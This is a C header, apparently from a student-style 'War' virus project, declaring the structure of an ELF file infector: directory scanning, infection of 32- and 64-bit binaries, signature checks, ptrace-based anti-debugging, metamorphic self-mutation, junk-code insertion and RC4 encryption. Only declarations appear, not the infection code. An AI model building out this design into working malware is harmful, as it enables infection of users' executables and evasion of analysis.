#ifndef WAR_H
#define WAR_H
#include <stdlib.h>
#include <dirent.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdbool.h>
#include <elf.h>
#include <time.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/reg.h>
#include <signal.h>
#include <math.h>
#include "config.h"
#define SYS_CUSTOM_WRITE 6969
#define SYS_CUSTOM_OPEN 6767
#define SYS_CUSTOM_CLOSE 9696
#define MAX_SIGNATURE_LEN 128
typedef struct
{
	void *data;
	size_t size;
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;
} t_elf;
typedef struct {
    void *code;
    size_t size;
    size_t sig_offset;
} virus_payload;
// Después de la definición de t_elf, agregar:

typedef struct {
    void *data;
    size_t size;
    int class;  // ELFCLASS32 o ELFCLASS64
    
    union {
        Elf32_Ehdr *ehdr32;
        Elf64_Ehdr *ehdr64;
    };
    
    union {
        Elf32_Phdr *phdr32;
        Elf64_Phdr *phdr64;
    };
    
    union {
        Elf32_Shdr *shdr32;
        Elf64_Shdr *shdr64;
    };
} t_elf_unified;
// Funciones para parsear ambos formatos
int parse_elf_unified(const char *filename, t_elf_unified *elf);
void cleanup_elf_unified(t_elf_unified *elf);
void is_process_running(const char *process_name);
void run_with_tracer(void);
void child_process(void);
void parent_tracer(pid_t child_pid);
void do_infection_work(void);
static inline ssize_t custom_write(int fd, const void *buf, size_t count) { return syscall(SYS_CUSTOM_WRITE, fd, buf, count); }
static inline int custom_open(const char *path, int flags) { return syscall(SYS_CUSTOM_OPEN, path, flags); }
static inline int custom_close(int fd) { return syscall(SYS_CUSTOM_CLOSE, fd); }
int parse_elf(const char *filename, t_elf *elf);
void cleanup_elf(t_elf *elf);
Elf64_Shdr *find_section(t_elf *elf, const char *name);
const char *get_signature(void);
const char *get_new_signature(void);
bool is_infected(t_elf *elf);
void scan_and_infect(const char *dir1, const char *dir2);
void scan_directory(const char *dir_path);
bool is_elf64_file(const char *filepath);
int infect_elf64(const char *filepath, t_config * config);
bool is_elf32_file(const char *filepath);
int infect_elf32(const char *filepath, t_config *cfg);
void init_metamorph(void);
void insert_garbage(void);
void insert_garbage5(void);
void insert_garbage4(void);
void insert_garbage3(void);
void insert_garbage2(void);
int get_execution_order(void);
void random_delay(void);
void rc4_crypt(unsigned char *data, size_t datalen, const unsigned char *key, size_t keylen);
void metamorph_mutate_self(void);
#endif
